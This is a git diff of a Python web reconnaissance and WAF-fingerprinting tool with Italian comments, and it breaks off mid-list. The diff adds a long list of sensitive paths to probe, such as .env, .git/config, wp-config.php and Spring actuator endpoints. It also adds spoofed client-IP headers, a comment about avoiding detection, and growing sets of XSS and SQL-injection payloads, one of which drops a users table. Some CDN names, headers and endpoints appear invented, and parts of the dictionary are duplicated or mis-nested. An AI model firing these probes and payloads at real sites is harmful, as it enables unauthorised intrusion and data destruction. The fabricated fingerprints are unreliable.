@@ -94,7 +94,7 @@ class ServiceDiscoveryEnhanced:
         }
 
     def _normalize_headers(self, headers: dict) -> dict:
-        """AGGIUNGI QUESTO: Normalizza header per matching case-insensitive"""
+        """Normalizza header per matching case-insensitive"""
         normalized = {}
         for header_name, header_value in headers.items():
             key_normalized = header_name.lower().strip()
@@ -116,10 +116,6 @@ class ServiceDiscoveryEnhanced:
             if key.lower() == header_lower:
                 return value
         return None
-
-
-
-
 
         # Set realistic headers to avoid detection
         self.session.headers.update({
@@ -1221,7 +1217,8 @@ class ServiceMeshDetector:
 class RequestTracker:
     def __init__(self):
         self.transformations = []
-
+        self.previous_requests = {}  # Store previous request data by request_id
+    
     def track_request(self, request_id: str, layer: str, request_data: Dict) -> Dict:
         transformation = {
             'request_id': request_id,
@@ -1232,61 +1229,255 @@ class RequestTracker:
             'mutations': self._analyze_mutations(request_data)
         }
         self.transformations.append(transformation)
+        
+        # Store current request for future comparison
+        self.previous_requests[request_id] = request_data
+        
         return transformation
-
+    
     def _analyze_mutations(self, request_data: Dict) -> Dict:
         return {
             'headers_changed': self._detect_header_changes(request_data),
             'payload_modified': self._detect_payload_changes(request_data),
             'encoding_changes': self._detect_encoding_changes(request_data)
         }
-
+    
     def _detect_header_changes(self, request_data: Dict) -> List[str]:
-        return []
-
+        """
+        Rileva i cambiamenti negli header confrontando con le richieste precedenti
+        """
+        request_id = request_data.get('request_id')
+        current_headers = request_data.get('headers', {})
+        changes = []
+        
+        # Se abbiamo una richiesta precedente, confronta gli headers
+        if request_id and request_id in self.previous_requests:
+            previous_headers = self.previous_requests[request_id].get('headers', {})
+            
+            # Controlla headers aggiunti o modificati
+            for key, value in current_headers.items():
+                if key not in previous_headers:
+                    changes.append(f"Added header: {key}")
+                elif previous_headers[key] != value:
+                    changes.append(f"Modified header: {key}")
+            
+            # Controlla headers rimossi
+            for key in previous_headers:
+                if key not in current_headers:
+                    changes.append(f"Removed header: {key}")
+        
+        # Controlla per header sospetti o modificazioni comuni
+        suspicious_headers = ['x-forwarded-for', 'user-agent', 'authorization', 'cookie']
+        for header in suspicious_headers:
+            if header.lower() in [h.lower() for h in current_headers.keys()]:
+                changes.append(f"Suspicious header present: {header}")
+        
+        return changes
+    
     def _detect_payload_changes(self, request_data: Dict) -> bool:
+        """
+        Rileva se il payload è stato modificato
+        """
+        request_id = request_data.get('request_id')
+        current_payload = request_data.get('payload', {})
+        
+        # Se abbiamo una richiesta precedente, confronta i payload
+        if request_id and request_id in self.previous_requests:
+            previous_payload = self.previous_requests[request_id].get('payload', {})
+            return current_payload != previous_payload
+        
         return False
-
+    
     def _detect_encoding_changes(self, request_data: Dict) -> List[str]:
-        return []
+        """
+        Rileva cambiamenti nell'encoding del payload
+        """
+        changes = []
+        headers = request_data.get('headers', {})
+        payload = request_data.get('payload', {})
+        
+        # Controlla Content-Type per encoding
+        content_type = headers.get('content-type', '').lower()
+        if 'charset=' in content_type:
+            charset = content_type.split('charset=')[1].split(';')[0].strip()
+            changes.append(f"Charset detected: {charset}")
+        
+        # Controlla Content-Encoding
+        content_encoding = headers.get('content-encoding', '').lower()
+        if content_encoding:
+            changes.append(f"Content encoding: {content_encoding}")
+        
+        # Controlla se il payload sembra essere encoded
+        if isinstance(payload, dict):
+            for key, value in payload.items():
+                if isinstance(value, str):
+                    # Controlla per base64
+                    if self._is_base64_encoded(value):
+                        changes.append(f"Base64 encoded value in field: {key}")
+                    
+                    # Controlla per URL encoding
+                    if self._is_url_encoded(value):
+                        changes.append(f"URL encoded value in field: {key}")
+                        
+                    # Controlla per possibili JSON escaped
+                    if value.startswith('{') or value.startswith('['):
+                        try:
+                            json.loads(value)
+                            changes.append(f"JSON string in field: {key}")
+                        except:
+                            pass
+        
+        return changes
+    
+    def _is_base64_encoded(self, value: str) -> bool:
+        """Controlla se una stringa potrebbe essere base64"""
+        try:
+            if len(value) % 4 == 0 and len(value) > 10:
+                base64.b64decode(value)
+                return True
+        except:
+            pass
+        return False
+    
+    def _is_url_encoded(self, value: str) -> bool:
+        """Controlla se una stringa è URL encoded"""
+        decoded = urllib.parse.unquote(value)
+        return decoded != value and '%' in value
 
 class PayloadAnalyzer:
     def __init__(self):
         self.mutation_types = ['encoding', 'structure', 'content']
-
+    
     def analyze_mutations(self, original_payload: Dict, modified_payload: Dict) -> Dict:
         mutations = {
             'type': [],
             'changes': [],
             'severity': 'low'
         }
+        
+        # Controlla cambiamenti strutturali
         if self._check_structural_changes(original_payload, modified_payload):
             mutations['type'].append('structural')
             mutations['severity'] = 'high'
+        
+        # Controlla cambiamenti di encoding
         encoding_changes = self._check_encoding_changes(original_payload, modified_payload)
         if encoding_changes:
             mutations['type'].append('encoding')
             mutations['changes'].extend(encoding_changes)
+            if mutations['severity'] == 'low':
+                mutations['severity'] = 'medium'
+        
+        # Controlla cambiamenti di contenuto
+        content_changes = self._check_content_changes(original_payload, modified_payload)
+        if content_changes:
+            mutations['type'].append('content')
+            mutations['changes'].extend(content_changes)
+        
         return mutations
-
+    
     def _check_structural_changes(self, original: Dict, modified: Dict) -> bool:
-        return False
-
+        """
+        Controlla se ci sono cambiamenti strutturali significativi
+        """
+        # Controlla se le chiavi sono cambiate
+        original_keys = set(self._get_all_keys(original))
+        modified_keys = set(self._get_all_keys(modified))
+        
+        # Se sono state aggiunte o rimosse chiavi, è un cambiamento strutturale
+        if original_keys != modified_keys:
+            return True
+        
+        # Controlla se il tipo di dati è cambiato per le stesse chiavi
+        return self._check_type_changes(original, modified)
+    
     def _check_encoding_changes(self, original: Dict, modified: Dict) -> List[str]:
-        return []
-
-class StackHandler:
-    def __init__(self):
-        self.known_stacks = {
-            'cloudflare_nginx': {
-                'waf_headers': ['cf-ray', 'cf-cache-status'],
-                'proxy_headers': ['x-real-ip', 'x-forwarded-for']
-            },
-            'aws_waf_apache': {
-                'waf_headers': ['x-amzn-trace-id'],
-                'proxy_headers': ['x-forwarded-proto']
-            }
-        }
+        """
+        Rileva cambiamenti nell'encoding dei valori
+        """
+        changes = []
+        
+        for key in original.keys():
+            if key in modified:
+                orig_val = str(original[key])
+                mod_val = str(modified[key])
+                
+                # Controlla se un valore è diventato base64
+                if not self._is_base64_like(orig_val) and self._is_base64_like(mod_val):
+                    changes.append(f"Value '{key}' appears to be base64 encoded")
+                
+                # Controlla se un valore è stato decodificato
+                elif self._is_base64_like(orig_val) and not self._is_base64_like(mod_val):
+                    changes.append(f"Value '{key}' appears to be base64 decoded")
+                
+                # Controlla URL encoding
+                if '%' not in orig_val and '%' in mod_val:
+                    changes.append(f"Value '{key}' appears to be URL encoded")
+                elif '%' in orig_val and '%' not in mod_val:
+                    changes.append(f"Value '{key}' appears to be URL decoded")
+        
+        return changes
+    
+    def _check_content_changes(self, original: Dict, modified: Dict) -> List[str]:
+        """
+        Rileva cambiamenti nel contenuto effettivo
+        """
+        changes = []
+        
+        for key in original.keys():
+            if key in modified:
+                if original[key] != modified[key]:
+                    changes.append(f"Content changed in field '{key}'")
+            else:
+                changes.append(f"Field '{key}' was removed")
+        
+        for key in modified.keys():
+            if key not in original:
+                changes.append(f"New field '{key}' was added")
+        
+        return changes
+    
+    def _get_all_keys(self, data: Dict, prefix: str = "") -> List[str]:
+        """
+        Ottiene tutte le chiavi in modo ricorsivo per strutture annidate
+        """
+        keys = []
+        for key, value in data.items():
+            full_key = f"{prefix}.{key}" if prefix else key
+            keys.append(full_key)
+            
+            if isinstance(value, dict):
+                keys.extend(self._get_all_keys(value, full_key))
+        
+        return keys
+    
+    def _check_type_changes(self, original: Dict, modified: Dict) -> bool:
+        """
+        Controlla se il tipo di dati è cambiato per le chiavi comuni
+        """
+        for key in original.keys():
+            if key in modified:
+                if type(original[key]) != type(modified[key]):
+                    return True
+                
+                # Controlla ricorsivamente per dict annidati
+                if isinstance(original[key], dict) and isinstance(modified[key], dict):
+                    if self._check_type_changes(original[key], modified[key]):
+                        return True
+        
+        return False
+    
+    def _is_base64_like(self, value: str) -> bool:
+        """
+        Controlla se una stringa assomiglia a base64
+        """
+        if not isinstance(value, str) or len(value) < 4:
+            return False
+        
+        # Base64 dovrebbe essere divisibile per 4 e contenere solo caratteri validi
+        import re
+        base64_pattern = re.compile(r'^[A-Za-z0-9+/]*={0,2}$')
+        return len(value) % 4 == 0 and base64_pattern.match(value) and len(value) > 10
 
     def handle_request(self, stack_type: str, request_data: Dict) -> Dict:
         if stack_type in self.known_stacks:
@@ -1353,7 +1544,7 @@ class ApplicationTraceroute:
         self.mesh_detector = ServiceMeshDetector()
         self.request_tracker = RequestTracker()
         self.payload_analyzer = PayloadAnalyzer()
-        self.stack_handler = StackHandler()
+        #self.stack_handler = StackHandler()
         self.command_generator = None     
 
         # Forbidden endpoint configuration
@@ -1429,14 +1620,170 @@ class ApplicationTraceroute:
                 print(f"  ⚠️ Error checking provided endpoint: {e}")
         
         # Search for common protected endpoints
+        # Extended list of common protected endpoints that typically return 401/403
         common_protected = [
+            # Original admin endpoints
             '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
             '/manage', '/console', '/portal', '/control', '/private',
             '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
-            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer', '/users'
-            '/pages', '/root', '/uploads', '/includes', 'cgi-bin'
+            
+            # Configuration and sensitive files
+            '/.env', '/.env.local', '/.env.production', '/.env.backup',
+            '/.git', '/.git/config', '/.gitignore', '/.gitlab-ci.yml',
+            '/config', '/config.php', '/config.json', '/config.yml',
+            '/configuration.php', '/wp-config.php', '/app.config',
+            '/.htaccess', '/.htpasswd', '/web.config', '/robots.txt',
+            '/sitemap.xml', '/.well-known',
+            
+            # Database administration
+            '/phpmyadmin', '/pma', '/adminer', '/mysql', '/database',
+            '/db', '/dbadmin', '/sqlmanager', '/myadmin', '/phpMyAdmin',
+            '/mysqladmin', '/sql', '/db_admin', '/database_administration',
+            
+            # User management and authentication
+            '/users', '/user', '/accounts', '/account', '/profile', '/profiles',
+            '/login', '/signin', '/auth', '/authentication', '/oauth',
+            '/sso', '/saml', '/ldap', '/register', '/signup',
+            
+            # API endpoints
+            '/api', '/api/v1', '/api/v2', '/api/admin', '/api/internal',
+            '/api/private', '/api/user', '/api/users', '/api/auth',
+            '/api/login', '/api/admin/users', '/api/config', '/api/settings',
+            '/graphql', '/graphiql', '/playground', '/altair',
+            
+            # Content Management Systems (CMS)
+            '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes',
+            '/wp-json', '/xmlrpc.php', '/wp-cron.php',
+            '/drupal', '/sites/default', '/node', '/user/login',
+            '/joomla', '/joomla/administrator', '/typo3', '/umbraco',
+            
+            # Development and staging
+            '/dev', '/development', '/test', '/testing', '/stage', '/staging',
+            '/debug', '/trace', '/logs', '/log', '/monitoring',
+            '/health', '/status', '/info', '/version', '/build',
+            
+            # System directories
+            '/pages', '/root', '/home', '/var', '/etc', '/tmp',
+            '/uploads', '/upload', '/files', '/documents', '/media',
+            '/images', '/assets', '/static', '/resources',
+            '/includes', '/lib', '/libraries', '/vendor',
+            '/cgi-bin', '/cgi', '/bin', '/scripts',
+            
+            # Backup and archive files
+            '/backup', '/backups', '/bak', '/old', '/archive',
+            '/dump', '/sql', '/.bak', '/backup.zip', '/backup.tar.gz',
+            '/db_backup.sql', '/database.sql', '/data.sql',
+            
+            # Server status and monitoring
+            '/server-status', '/server-info', '/status', '/stats',
+            '/metrics', '/health', '/ping', '/heartbeat',
+            '/actuator', '/actuator/health', '/actuator/info', '/actuator/metrics',
+            '/management', '/jolokia', '/hawtio',
+            
+            # Framework specific endpoints
+            # Spring Boot
+            '/actuator', '/actuator/beans', '/actuator/env', '/actuator/configprops',
+            '/actuator/mappings', '/actuator/sessions', '/actuator/shutdown',
+            '/actuator/trace', '/actuator/dump', '/actuator/jolokia',
+            '/actuator/logfile', '/actuator/refresh', '/actuator/restart',
+            
+            # Django
+            '/django-admin', '/__debug__', '/admin/doc', '/admin/auth',
+            
+            # Laravel
+            '/telescope', '/horizon', '/nova', '/log-viewer',
+            
+            # Node.js/Express
+            '/debug', '/_debugger', '/inspector', '/profiler',
+            
+            # Flask
+            '/admin', '/admin/login', '/_debug_toolbar',
+            
+            # Documentation endpoints
+            '/docs', '/doc', '/documentation', '/swagger', '/swagger-ui',
+            '/swagger.json', '/swagger.yaml', '/openapi.json',
+            '/redoc', '/api-docs', '/apidocs', '/api/docs',
+            
+            # Security tools and panels
+            '/security', '/firewall', '/waf', '/ids', '/ips',
+            '/antivirus', '/scanner', '/audit', '/compliance',
+            
+            # Cloud and container specific
+            '/kubernetes', '/k8s', '/docker', '/containers',
+            '/pods', '/services', '/ingress', '/metrics-server',
+            '/prometheus', '/grafana', '/jaeger', '/zipkin',
+            
+            # CI/CD and DevOps
+            '/jenkins', '/bamboo', '/teamcity', '/gitlab',
+            '/github', '/bitbucket', '/azure-devops', '/travis',
+            '/circleci', '/drone', '/argo', '/tekton',
+            
+            # Specific application panels
+            '/nagios', '/zabbix', '/cacti', '/munin', '/icinga',
+            '/kibana', '/elasticsearch', '/logstash', '/splunk',
+            '/sonarqube', '/nexus', '/artifactory', '/harbor',
+            
+            # E-commerce specific
+            '/checkout', '/payment', '/billing', '/invoice',
+            '/orders', '/cart', '/wishlist', '/customer',
+            '/merchant', '/vendor', '/seller',
+            
+            # Communication tools
+            '/mail', '/webmail', '/roundcube', '/squirrelmail',
+            '/horde', '/zimbra', '/exchange', '/outlook',
+            '/chat', '/slack', '/teams', '/discord',
+            
+            # File management
+            '/filemanager', '/ftp', '/sftp', '/files', '/explorer',
+            '/finder', '/directory', '/browse', '/tree',
+            
+            # Miscellaneous sensitive paths
+            '/internal', '/intranet', '/extranet', '/partner',
+            '/client', '/customer', '/member', '/premium',
+            '/vip', '/executive', '/board', '/leadership',
+            '/hr', '/finance', '/accounting', '/legal',
+            
+            # Version control and source code
+            '/.svn', '/.hg', '/.bzr', '/CVS',
+            '/src', '/source', '/sources', '/code',
+            
+            # Cache and temporary files
+            '/cache', '/tmp', '/temp', '/temporary',
+            '/session', '/sessions', '/var/cache', '/var/tmp',
+            
+            # Mobile and API gateways
+            '/mobile', '/m', '/api/mobile', '/mobile-api',
+            '/gateway', '/proxy', '/reverse-proxy',
+            
+            # Analytics and tracking
+            '/analytics', '/tracking', '/stats', '/reports',
+            '/dashboard', '/overview', '/summary',
+            
+            # Backup services
+            '/backup', '/restore', '/snapshot', '/clone',
+            '/export', '/import', '/migrate', '/sync',
+            
+            # Third-party integrations
+            '/oauth2', '/openid', '/cas', '/radius',
+            '/active-directory', '/ldap', '/saml2',
+            '/facebook', '/google', '/twitter', '/linkedin',
+            '/github', '/gitlab', '/bitbucket',
+            
+            # Error and debug pages
+            '/error', '/errors', '/404', '/500', '/debug',
+            '/trace', '/exception', '/stacktrace',
+            
+            # Testing and QA
+            '/qa', '/quality', '/test-results', '/coverage',
+            '/performance', '/load-test', '/stress-test',
+            
+            # Additional file extensions that might be protected
+            '/.DS_Store', '/thumbs.db', '/.vscode', '/.idea',
+            '/composer.json', '/package.json', '/yarn.lock',
+            '/Gemfile', '/requirements.txt', '/pom.xml',
+            '/build.gradle', '/Dockerfile', '/docker-compose.yml'
         ]
-        
+
         for endpoint in common_protected:
             try:
                 url = self.target_url + endpoint
@@ -1462,6 +1809,8 @@ class ApplicationTraceroute:
         # Sistema di detection esteso per tutti i possibili layer
         return {
             # Layer 1: Edge/CDN Detection
+            # Sistema di detection esteso per tutti i possibili layer
+            # Layer 1: Edge/CDN Detection
             'cdn_detection': {
                 'priority': 1,
                 'headers': {
@@ -1471,18 +1820,277 @@ class ApplicationTraceroute:
                     'X-Edge-Test': markers['sequence'],
                     'CF-Connecting-IP': f'127.0.0.1',  # Test Cloudflare
                     'X-Forwarded-Proto': 'https',
-                    'X-Original-URL': f'/test-{markers["uuid"]}'
+                    'X-Original-URL': f'/test-{markers["uuid"]}',
+                    'True-Client-IP': '127.0.0.1',  # Test Akamai
+                    'Fastly-Client-IP': '127.0.0.1',  # Test Fastly
+                    'X-Real-IP': '127.0.0.1',
+                    'X-Cluster-Client-IP': '127.0.0.1'
                 },
                 'expected_responses': [
-                    'cloudflare', 'cloudfront', 'fastly', 'akamai', 'maxcdn',
-                    'keycdn', 'bunnycdn', 'stackpath', 'quantil'
+                    # Major Global CDNs
+                    'cloudflare', 'cloudfront', 'fastly', 'akamai', 'azure-cdn',
+                    'google-cdn', 'google-cloud-cdn', 'amazon-cloudfront',
+                    
+                    # Popular Commercial CDNs
+                    'maxcdn', 'stackpath', 'keycdn', 'bunnycdn', 'quantil',
+                    'cdn77', 'jsdelivr', 'unpkg', 'bootstrapcdn', 'cdnjs',
+                    
+                    # Enterprise CDNs
+                    'limelight', 'edgecast', 'level3', 'verizon-cdn', 'att-cdn',
+                    'chinacache', 'cachefly', 'highwinds', 'incapsula', 'imperva',
+                    
+                    # Regional/Specialized CDNs
+                    'belugacdn', 'gcore', 'goooood-cdn', 'sucuri', 'swarmify',
+                    'rackspace-cdn', 'softlayer-cdn', 'cdnlion', 'alicdn', 'tencent-cdn',
+                    
+                    # Security-focused CDNs
+                    'sucuri-cdn', 'incapsula-cdn', 'imperva-cdn', 'cloudflare-spectrum',
+                    'ddos-guard', 'koddos', 'blazingfast', 'ovh-cdn',
+                    
+                    # Asian CDNs
+                    'alicloud-cdn', 'tencent-cloud-cdn', 'baidu-cdn', 'qiniu-cdn',
+                    'upyun-cdn', 'chinacache', 'wangsu', 'kingsoft-cdn',
+                    'netcenter', 'sina-cdn', 'ksyun-cdn',
+                    
+                    # European CDNs
+                    'ovh-cdn', 'scaleway-cdn', 'hetzner-cdn', 'contabo-cdn',
+                    'digitalocean-cdn', 'linode-cdn', 'vultr-cdn',
+                    
+                    # Emerging/Niche CDNs
+                    'section-cdn', 'optimole', 'wp-rocket-cdn', 'jetpack-cdn',
+                    'autoptimize-cdn', 'wp-super-cache-cdn', 'w3-total-cache-cdn',
+                    
+                    # Video/Streaming CDNs
+                    'wowza-cdn', 'jwplayer-cdn', 'brightcove-cdn', 'vimeo-cdn',
+                    'youtube-cdn', 'twitch-cdn', 'netflix-cdn', 'hulu-cdn',
+                    
+                    # Government/Enterprise
+                    'govcdn', 'milcdn', 'educdn', 'healthcare-cdn',
+                    
+                    # Open Source/Community
+                    'jsdelivr-cdn', 'unpkg-cdn', 'cdnjs-cloudflare', 'github-cdn',
+                    'gitlab-cdn', 'raw-githubusercontent'
                 ],
                 'detection_headers': [
-                    'cf-ray', 'x-amz-cf-id', 'x-served-by', 'x-cache',
-                    'x-edge-location', 'x-cdn-pop'
+                    # Cloudflare headers
+                    'cf-ray', 'cf-cache-status', 'cf-request-id', 'cf-connecting-ip',
+                    'cf-visitor', 'cf-ipcountry', 'cf-apo-via', 'expect-ct',
+                    
+                    # AWS CloudFront headers
+                    'x-amz-cf-id', 'x-amz-cf-pop', 'x-cache', 'x-amz-request-id',
+                    'x-amzn-trace-id', 'x-amzn-requestid',
+                    
+                    # Akamai headers
+                    'akamai-origin-hop', 'akamai-transformed', 'akamai-cache-status',
+                    'akamai-request-id', 'akamai-ghost-ip', 'true-client-ip',
+                    'akamai-edge-ip', 'x-akamai-transformed', 'x-akamai-staging',
+                    
+                    # Fastly headers
+                    'x-served-by', 'x-cache', 'x-cache-hits', 'fastly-debug-digest',
+                    'fastly-restarts', 'fastly-client-ip', 'fastly-ff', 'x-timer',
+                    
+                    # Azure CDN headers
+                    'x-azure-ref', 'x-msedge-ref', 'x-cache', 'x-azure-fdid',
+                    
+                    # Google Cloud CDN headers
+                    'x-goog-trace', 'x-cloud-trace-context', 'x-gfe-response-code-details-trace',
+                    'x-goog-generation', 'x-goog-hash', 'x-goog-storage-class',
+                    
+                    # KeyCDN headers
+                    'x-keycdn-pop', 'x-edge-location', 'x-pull-zone',
+                    
+                    # MaxCDN/StackPath headers
+                    'x-maxcdn-pop', 'x-sp-edge-pop', 'x-stackpath-edge-pop',
+                    
+                    # BunnyCDN headers
+                    'bunnycdn-cache-status', 'x-bunnycdn-pop', 'cdn-cache-control',
+                    
+                    # CDN77 headers
+                    'x-cdn77-pop', 'x-cdn77-cache-status',
+                    
+                    # Quantil/BelugaCDN headers
+                    'x-qcdn-pop', 'x-beluga-cache-status',
+                    
+                    # Limelight headers
+                    'x-llnw-pop', 'x-ll-pop', 'x-ll-cache',
+                    
+                    # Edgecast/Verizon headers
+                    'x-ec-debug', 'x-ec-cache', 'x-ec-cache-key', 'x-ec-check-cacheable',
+                    
+                    # Incapsula/Imperva headers
+                    'x-iinfo', 'x-cdn', 'incap-ses', 'visid_incap',
+                    
+                    # CacheFly headers
+                    'x-cf-pop', 'x-cf-served-by', 'x-cf-cache-status',
+                    
+                    # Sucuri headers
+                    'x-sucuri-id', 'x-sucuri-cache', 'x-sucuri-block',
+                    
+                    # Chinese CDNs
+                    'ali-cdn-cache-status', 'x-ali-cdn-pop', 'x-tengxun-cache',
+                    'x-tencent-cache', 'x-baidu-cache', 'x-qiniu-cache',
+                    'x-upyun-cache', 'x-cc-cache', 'x-ws-cache',
+                    
+                    # European CDNs  
+                    'x-ovh-cache', 'x-scaleway-cache', 'x-hetzner-cache',
+                    'x-do-cache', 'x-linode-cache', 'x-vultr-cache',
+                    
+                    # Video CDNs
+                    'x-wowza-cache', 'x-jwplayer-cache', 'x-bc-cache',
+                    'x-vimeo-cache', 'x-yt-cache', 'x-twitch-cache',
+                    
+                    # Generic detection headers
+                    'x-cdn-pop', 'x-edge-location', 'x-pop', 'x-cache-status',
+                    'x-served-by', 'x-cache', 'x-proxy-cache', 'x-hit',
+                    'x-origin-pop', 'x-edge-server', 'x-cdn-server',
+                    
+                    # Security CDN headers
+                    'x-waf-event-info', 'x-firewall-pop', 'x-security-check',
+                    'x-ddos-protection', 'x-rate-limit-pop'
                 ],
                 'timing_analysis': True,
-                'geo_routing_test': True
+                'geo_routing_test': True,
+                
+                # Additional detection methods
+                'advanced_detection': {
+                    # Test CDN-specific endpoints
+                    'test_endpoints': [
+                        '/__cf_cache_status',  # Cloudflare
+                        '/__aws_cf_status',     # CloudFront  
+                        '/__fastly_status',     # Fastly
+                        '/__akamai_status',     # Akamai
+                        '/__keycdn_status',     # KeyCDN
+                        '/__bunny_status',      # BunnyCDN
+                        '/__cdn77_status',      # CDN77
+                        '/__maxcdn_status'      # MaxCDN
+                    ],
+                    
+                    # DNS-based detection
+                    'dns_patterns': [
+                        # Cloudflare patterns
+                        '*.cloudflaressl.com', '*.cloudflare.com', '*.cf-*.com',
+                        
+                        # AWS CloudFront patterns
+                        '*.cloudfront.net', '*.amazonaws.com', '*.awsglobalaccelerator.com',
+                        
+                        # Akamai patterns  
+                        '*.akamaized.net', '*.akamaitechnologies.com', '*.akamai.net',
+                        '*.edgesuite.net', '*.edgekey.net',
+                        
+                        # Fastly patterns
+                        '*.fastly.com', '*.fastlylb.net', '*.fastly-analytics.com',
+                        
+                        # Other major CDNs
+                        '*.maxcdn.com', '*.stackpathcdn.com', '*.keycdn.com',
+                        '*.bunnycdn.com', '*.cdn77.com', '*.quantil.com',
+                        '*.belugacdn.com', '*.sucuri.net',
+                        
+                        # Chinese CDNs
+                        '*.alicdn.com', '*.aliyuncs.com', '*.myqcloud.com',
+                        '*.qiniucdn.com', '*.upaiyun.com', '*.chinacache.com',
+                        
+                        # Video CDNs
+                        '*.jwplatform.com', '*.brightcove.com', '*.vimeocdn.com',
+                        '*.ytimg.com', '*.googlevideo.com'
+                    ],
+                    
+                    # Response body fingerprinting
+                    'body_fingerprints': {
+                        'cloudflare': [
+                            'cloudflare', 'cf-ray', 'ray id:', 'checking your browser',
+                            'ddos protection by cloudflare', '__cf_bm'
+                        ],
+                        'aws_cloudfront': [
+                            'cloudfront', 'generated by cloudfront', 'aws cloudfront',
+                            'request id:', 'amazon cloudfront'
+                        ],
+                        'akamai': [
+                            'akamai', 'reference #', 'akamai ghost', 'edgescape',
+                            'akamai netsession', 'ghost ip'
+                        ],
+                        'fastly': [
+                            'fastly', 'fastly error', 'varnish', 'fastly cdn',
+                            'request id', 'fastly shield'
+                        ],
+                        'maxcdn': [
+                            'maxcdn', 'netdna', 'stackpath', 'max cdn',
+                            'pull zone', 'edge location'
+                        ],
+                        'keycdn': [
+                            'keycdn', 'key cdn', 'zone id', 'pop location'
+                        ],
+                        'bunnycdn': [
+                            'bunnycdn', 'bunny cdn', 'pull zone', 'edge server'
+                        ],
+                        'incapsula': [
+                            'incapsula', 'imperva', 'incap_ses', 'visid_incap',
+                            'security incident', 'access denied'
+                        ]
+                    },
+                    
+                    # SSL Certificate patterns
+                    'ssl_patterns': [
+                        '*.cloudflaressl.com', '*.cloudflare.com',
+                        '*.amazonaws.com', '*.awsglobalaccelerator.com',
+                        '*.akamai.com', '*.akamaized.net',
+                        '*.fastly.com', '*.fastlylb.net',
+                        '*.maxcdn.com', '*.stackpathcdn.com'
+                    ],
+                    
+                    # IP Range detection (examples)
+                    'ip_ranges': {
+                        'cloudflare': ['103.21.244.0/22', '103.22.200.0/22', '103.31.4.0/22'],
+                        'aws_cloudfront': ['13.32.0.0/15', '13.35.0.0/16', '13.54.0.0/15'],
+                        'akamai': ['23.0.0.0/12', '104.64.0.0/10', '184.24.0.0/13'],
+                        'fastly': ['23.235.32.0/20', '43.249.72.0/22', '103.244.50.0/24']
+                    },
+                    
+                    # Performance characteristics
+                    'performance_signatures': {
+                        'latency_patterns': {
+                            'edge_cdn': {'min': 10, 'max': 50},    # Very fast edge cache
+                            'regional_cdn': {'min': 50, 'max': 150}, # Regional cache
+                            'origin': {'min': 150, 'max': 1000}      # Direct to origin
+                        },
+                        'cache_behavior': {
+                            'aggressive_caching': ['cloudflare', 'maxcdn'],
+                            'moderate_caching': ['aws_cloudfront', 'fastly'],
+                            'selective_caching': ['akamai', 'keycdn']
+                        }
+                    },
+                
+                # Error page signatures for detection
+                'error_page_signatures': {
+                    'cloudflare_errors': [
+                        'error 1020', 'error 1006', 'ray id', 'cloudflare',
+                        'checking your browser', 'ddos protection'
+                    ],
+                    'aws_errors': [
+                        'cloudfront', 'generated by cloudfront', 'request id',
+                        'the request could not be satisfied'
+                    ],
+                    'akamai_errors': [
+                        'reference #', 'akamai', 'ghost ip', 'edgescape error'
+                    ],
+                    'fastly_errors': [
+                        'fastly error', 'varnish error', 'guru meditation',
+                        'service unavailable'
+                    ],
+                    'maxcdn_errors': [
+                        'netdna', 'maxcdn error', 'stackpath error',
+                        'pull zone error'
+                    ]
+                },
+                
+                # JavaScript-based detection
+                'javascript_detection': {
+                    'cloudflare_js': ['__cf_bm', 'cf_challenge_response', '_cf_chl_opt'],
+                    'incapsula_js': ['_incap_ses', 'incap_ses', 'visid_incap'],
+                    'sucuri_js': ['sucuri_cloudproxy_js', 'sucuri_waf'],
+                    'ddosguard_js': ['ddos-guard', 'ddg-challenge'],
+                    'akamai_js': ['_abck', 'ak_bmsc', 'akamai_bm']
+                }
+            }
             },
 
             # Layer 2: DDoS Protection Detection  
@@ -1507,6 +2115,7 @@ class ApplicationTraceroute:
             },
 
             # Layer 3: WAF Detection (Multi-vendor)
+            # Layer 3: WAF Detection (Multi-vendor Extended)
             'waf_detection': {
                 'priority': 3,
                 'payloads': {
@@ -1514,144 +2123,1239 @@ class ApplicationTraceroute:
                         f"/?xss=<script>alert('{markers['uuid']}')</script>",
                         f"/?xss=javascript:alert('{markers['uuid']}')",
                         f"/?xss=<img src=x onerror=alert('{markers['uuid']}')>",
-                        f"/?xss=<svg onload=alert('{markers['uuid']}')>"
+                        f"/?xss=<svg onload=alert('{markers['uuid']}')>",
+                        f"/?xss=<iframe src=javascript:alert('{markers['uuid']}')>",
+                        f"/?xss=<body onload=alert('{markers['uuid']}')>",
+                        f"/?xss=<details open ontoggle=alert('{markers['uuid']}')>",
+                        f"/?xss=<marquee onstart=alert('{markers['uuid']}')>",
+                        f"/?xss=<video><source onerror=\"alert('{markers['uuid']}')\">",
+                        f"/?xss=<audio src=x onerror=alert('{markers['uuid']}')>",
+                        f"/?xss=<select onfocus=alert('{markers['uuid']}') autofocus>",
+                        f"/?xss='><script>alert('{markers['uuid']}')</script>",
+                        f"/?xss=\"><script>alert('{markers['uuid']}')</script>",
+                        f"/?xss=</script><script>alert('{markers['uuid']}')</script>",
+                        f"/?xss=<ScRiPt>alert('{markers['uuid']}')</ScRiPt>",
+                        f"/?xss=<script/src=data:,alert('{markers['uuid']}')>",
+                        f"/?xss=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,{markers['uuid']},39,41))</script>"
                     ],
                     'sqli_tests': [
                         f"/?sql=' OR 1=1 -- {markers['uuid']}",
                         f"/?sql=' UNION SELECT '{markers['uuid']}' --",
                         f"/?sql=1'; DROP TABLE users; -- {markers['uuid']}",
-                        f"/?sql=1' AND SLEEP(5) -- {markers['uuid']}"
+                        f"/?sql=1' AND SLEEP(5) -- {markers['uuid']}",
+                        f"/?sql=1' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0 -- {markers['uuid']}",
+                        f"/?sql=1' UNION SELECT NULL,NULL,'{markers['uuid']}' --",
+                        f"/?sql=1'; WAITFOR DELAY '00:00:05' -- {markers['uuid']}",
+                        f"/?sql=1' AND SUBSTRING(@@version,1,1)='M' -- {markers['uuid']}",
+                        f"/?sql=1' OR '1'='1' -- {markers['uuid']}",
+                        f"/?sql=1' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects),1,1))>64 -- {markers['uuid']}",
+                        f"/?sql=1' AND (SELECT user FROM mysql.user WHERE user='{markers['uuid']}' LIMIT 1)='test' --",
